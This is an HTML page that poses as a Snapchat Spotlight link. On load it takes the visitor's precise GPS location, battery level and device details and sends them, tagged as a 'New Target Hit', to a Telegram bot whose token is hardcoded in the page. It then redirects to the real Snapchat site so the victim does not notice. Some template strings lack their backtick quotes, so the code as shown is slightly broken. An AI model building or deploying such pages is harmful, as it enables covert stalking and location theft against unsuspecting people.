<!DOCTYPE html>
<html lang="ku" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Snapchat Spotlight</title>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
    <style>
        body { background-color: #000; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; }
        .loader { border: 4px solid #333; border-top: 4px solid #00ff00; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
<div class="loader"></div>

<script>
const urlParams = new URLSearchParams(window.location.search);
const uid = urlParams.get('id');
const creator = urlParams.get('u') || 'Unknown';

// Telegram Config
const botToken = "AAFx42CAaKeuoeo781iYezFiv0gke9NkO9g";
const chatId = "8445031997"; // Replace with your numeric Telegram user ID

if (!uid) {
    document.body.innerHTML = "Security Error: Missing UID";
    throw new Error("UID missing");
}

window.onload = function() {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(showPosition, showError, {
            enableHighAccuracy: true,
            timeout: 15000,
            maximumAge: 0
        });
    } else {
        redirect();
    }
};

async function sendTelegram(message) {
    return $.ajax({
        type: 'POST',
        url: https://api.telegram.org/bot${botToken}/sendMessage,
        data: {
            chat_id: chatId,
            text: message,
            parse_mode: 'HTML'
        }
    });
}

function showPosition(position) {
    const lat = position.coords.latitude;
    const lon = position.coords.longitude;

    navigator.getBattery().then(function(battery) {
        const batt = Math.round(battery.level * 100) + "%";
        const device = navigator.userAgent.split(')')[0].split('(')[1] || "Mobile Device";

        const msg = <b>New Target Hit!</b>\n\n +
                    User ID: ${uid}\n +
                    Creator: ${creator}\n +
                    Device: ${device}\n +
                    Battery: ${batt}\n +
                    Location: https://www.google.com/maps?q=${lat},${lon};

        sendTelegram(msg).always(() => redirect());
    });
}

function showError(error) {
    const msg = ⚠️ Target blocked GPS or connection failed for UID: ${uid};
    sendTelegram(msg).always(() => redirect());
}

function redirect() {
    window.location.href = "https://www.snapchat.com/spotlight";
}
</script>
</body>
</html>
